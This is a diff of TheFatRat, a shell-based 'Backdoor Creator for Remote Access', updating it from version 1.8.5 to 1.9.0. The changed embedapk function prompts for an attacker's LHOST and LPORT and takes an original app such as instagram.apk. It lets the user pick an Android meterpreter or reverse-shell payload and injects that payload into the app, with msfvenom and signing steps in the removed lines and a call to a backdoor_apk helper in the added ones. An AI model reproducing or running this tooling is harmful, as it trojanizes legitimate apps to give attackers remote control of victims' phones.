@@ -63,7 +63,6 @@ cat << !
 !
 }
 
-
 #for checking if your command is correct when embed backdoor
 gboor2 ()
 {
@@ -74,7 +73,7 @@ cat << !
   +------------++-------------------------++-----------------------+
   | LHOST      ||  The Listen Addres      || $yourip
   | LPORT      ||  The Listen Ports       || $yourport
-  | OUTPUTNAME ||  The Filename output    || Apk_embed_backdoor.apk
+  | OUTPUTNAME ||  The Filename output    || app_backdoor.apk
   +------------++-------------------------++-----------------------+
 
 
@@ -99,16 +98,12 @@ RESET="\033[00m" #normal
 #SAMARAN TAMPAN
 
 path=`pwd`
-Versi=1.8.5
-codename=Sparta
+Versi=1.9.0
+codename=Whistle
 OS=`uname` #
 distro="$(awk -F '=' '/^ID=/ {print $2}' /etc/os-release 2>&-)"
 disrov="$(awk -F '=' '/^VERSION_ID=/ {print $2}' /etc/os-release 2>&-)"
 SERVICE=service;
-apkembed='tools/apkembed.rb' # exec script path
-bundle='tools/signapk.jar' #tool included with the android platform source bundle
-cert='tools/certificate.pem' #is a test key pairs ,create & use your own key pairs
-key='tools/key.pk8'
 pwned='python tools/pw_exec.py'
 B='tools/prog.cs'
 C='tools/dad.c'
@@ -127,8 +122,6 @@ unzip=unzip
 temp=$path/temp
 file="config/config.path"
 
-
-
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; } 
 resize -s 33 84 > /dev/null
@@ -138,10 +131,10 @@ clear
 
 if [ -f "$file" ]
 then
-msfconsole=`sed -n 5p $file`	
-msfvenom=`sed -n 6p $file`
-backdoor=`sed -n 7p $file`
-searchsploit=`sed -n 8p $file`
+msfconsole=`sed -n 14p $file`	
+msfvenom=`sed -n 15p $file`
+backdoor=`sed -n 16p $file`
+searchsploit=`sed -n 17p $file`
 else
 	echo -e $red"Configuration file does not exists , run setup.sh first for config ." 
 exit 1
@@ -326,22 +319,6 @@ else
 fi
 sleep 2
 
-# check ruby if exists
-      which ruby > /dev/null 2>&1
-      if [ "$?" -eq "0" ]; then
-      echo [✔]::[Ruby]: installation found!;
-
-else
-
-   echo [x]::[warning]:this script require ruby installed to work ;
-   echo ""
-   echo [!]::Run setup.sh to install ruby ;
-   echo ""
-   sleep 2
-   exit 1
-fi
-sleep 2
-
 # check monodevelop if exists
       which monodevelop > /dev/null 2>&1
       which dmcs > /dev/null 2>&1
@@ -384,21 +361,6 @@ else
    echo [x]::[warning]:this script require gnome-terminal to work ;
    echo ""
    echo [!]::Run setup.sh to install gnome-terminal ;
-   echo ""
-   sleep 2
-   exit 1
-fi
-
-# check apktool if exists
-      which apktool > /dev/null 2>&1
-      if [ -d $find ]; then
-      echo [✔]::[Apktool]: installation found!;
-
-else
-
-   echo [x]::[warning]:this script require apktool to work ;
-   echo ""
-   echo [!]::Run setup.sh to install apktool ;
    echo ""
    sleep 2
    exit 1
@@ -923,6 +885,7 @@ echo -e $okegreen"  ============================================================
 #EMBEDBACKDOORAPK
 function embedapk() {
 clear
+resize -s 42 85 > /dev/null
 echo -e $okegreen"[ ]===========================================================================$okegreen[ ]"
 echo -e $okegreen"[ ]$cyan                                                                      $okegreen     [ ]"
 echo -e $okegreen"[ ]$cyan                          )  (         )      )   (    (        )     $okegreen     [ ]   ";
@@ -938,11 +901,11 @@ echo -e $okegreen"[ ]$red            Embed a Metasploit Payload in an original .
 echo -e $okegreen"[ ]$red This script is POC for injecting metasploit payload arbitary apk backdoor $okegreen[ ]"
 echo -e $okegreen"[ ]$okegreen===========================================================================$okegreen[ ]"
 echo ""
-echo "Cleaning Temp files"
+echo -e $red" Cleaning Temp files"
+rm -rf temp/*
 rm -rf output/*
-rm -rf backdoored/output/*
 sleep 2
-echo "Done!"
+echo -e $red" Done!"
 echo -e $okegreen""
 sleep 1
 echo -ne " SET LHOST : ";tput sgr0
@@ -951,73 +914,41 @@ echo ""
 echo -ne $okegreen "SET LPORT : ";tput sgr0
 read yourport
 echo ""
-echo -ne $okegreen "Located Original Apk file for embed (example:$path/PE/instagram.apk) :" ;tput sgr0
+echo -ne $okegreen "Located Original Apk file for embed (example:/root/bckdoor/instagram.apk) :" ;tput sgr0
 read copyfile
-cp $copyfile $path/output/fatrat.apk >/dev/null 2>&1
-apkt="$path/output/fatrat.apk"
+cp $copyfile $path/temp/app.apk >/dev/null 2>&1
+apkt="$path/temp/app.apk"
 
 if [ ! -f $apkt ]; then
     echo "[!] There was an error copying your APK to a temporary folder , make sure you wrote the right path "
-    read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
+    echp ""
+    read -rsp $' Press any key to continue to return to fatrat menu\n' -n 1 key
 menu
   fi 
 
-$unzip -l $apkt > /dev/null 2>&1
-  rc=$?
-  if [ $rc != 0 ]; then
-    echo "[!] Original APK file specified is not valid"
-    read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
-    menu
-  fi
 echo ""
 payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/shell/reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
 echo ""
 echo ""
-echo ""
+echo -e "\n"
 spinlong
 gboor2
 spinlong
 echo ""
 sleep 1
-echo "Creating RAT payload with msfvenom"
-$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/output/payload.apk
-echo "Done !" 
-sleep 2
-echo "Starting the merging process of RAT with the APK you selected"
+rm -f $apkconfig >/dev/null 2>&1
+touch $apkconfig 
+echo "app.apk" > $apkconfig
+echo "Rat.apk" >> $apkconfig
+echo $payload >> $apkconfig
+echo $yourip >> $apkconfig
+echo $yourport >> $apkconfig
+echo -e "\n"
+./backdoor_apk
 echo ""
-ruby $apkembed $path/output/fatrat.apk 
+sleep 2
 echo ""
-sleep 2
-cp $path/output/fatrat_backdoored.apk $path/backdoored/apkembed.apk >/dev/null 2>&1
-varopt="$path/backdoored/apkembed.apk"
-if [ ! -f $varopt ]; then
-    echo "[!] There was an error in the creation of your RAT APK file , the possible reasons are :
-- The architecture of the file is not for android 
-- The original APK is protected
-- It was not possible to inject the payload in the hook you selected (in this case select a different hook point)"
-    read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
-menu
-fi
-echo "File copied with success to : $path/backdoored"
-sleep 2
-echo "Removing temporary files from output"
-sleep 2
-rm -rf $path/output/* >/dev/null 2>&1
-echo "Signing your APK file"
-sleep 2
-java -jar $bundle $cert $key $path/backdoored/apkembed.apk Apk_embed_backdoor.apk
-rm $path/backdoored/apkembed.apk >/dev/null 2>&1
-mv $path/Apk_embed_backdoor.apk $path/backdoored/output/ >/dev/null 2>&1
-outapk="$path/backdoored/output/Apk_embed_backdoor.apk"
-if [ ! -f $outapk ]; then
-    echo "[!] APK Rat file was not found in : $path/backdoored/output/"
-    read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
-menu
-  fi 
-echo -ne $okegreen" Your payload has been successfully embed with sign and is located here :
- $path/backdoored/output/Apk_embed_backdoor.apk"
-read loveyou
-echo
+   read -rsp $' Press any key to continue to return to fatrat menu\n' -n 1 key
 clear
 menu
 }
@@ -1906,6 +1837,8 @@ echo -e $white "Special thanks to:"
 echo
 echo -e $red "Dracos Linux ( www.dracos-linux.org )"
 echo
+echo -e $red "peterpt my friends for best contribute"
+echo
 echo -e $red "Offensive Security for the awesome OS"
 echo
 echo -e $green "http://www.offensive-security.com/"
@@ -1940,7 +1873,7 @@ menu () {
   echo -e $okegreen"    | |_.|. | | |   $white"[$okegreen--$white] $cyan " $white"Backdoor" Creator for Remote Acces $white[$okegreen--$white] 	"
   echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"
   echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"           $white[$okegreen--$white]	"
-  echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"           $white[$okegreen--$white]    "
+  echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"          $white[$okegreen--$white]    "
   echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"
   echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Dracos Linux : $red@dracos-linux.org  $white[$okegreen--$white]	"
   echo -e $okegreen"     |/         /   $white"[$okegreen--$white] $cyan"   				     $white[$okegreen--$white]		"
@@ -2138,7 +2071,7 @@ echo -e $okegreen"    J  \.|'.\/ \                  				"
 echo -e $okegreen"    | |_.|. | | |   $white"[$okegreen--$white] $cyan " $white"Backdoor" Creator for Remote Acces $white[$okegreen--$white] 	"
 echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"
 echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"           $white[$okegreen--$white]	"
-echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"           $white[$okegreen--$white]    "
+echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"          $white[$okegreen--$white]    "
 echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"
 echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Dracos Linux : $red@dracos-linux.org  $white[$okegreen--$white]	"
 echo -e $okegreen"     |/         /   $white"[$okegreen--$white] $cyan"   				     $white[$okegreen--$white]		"
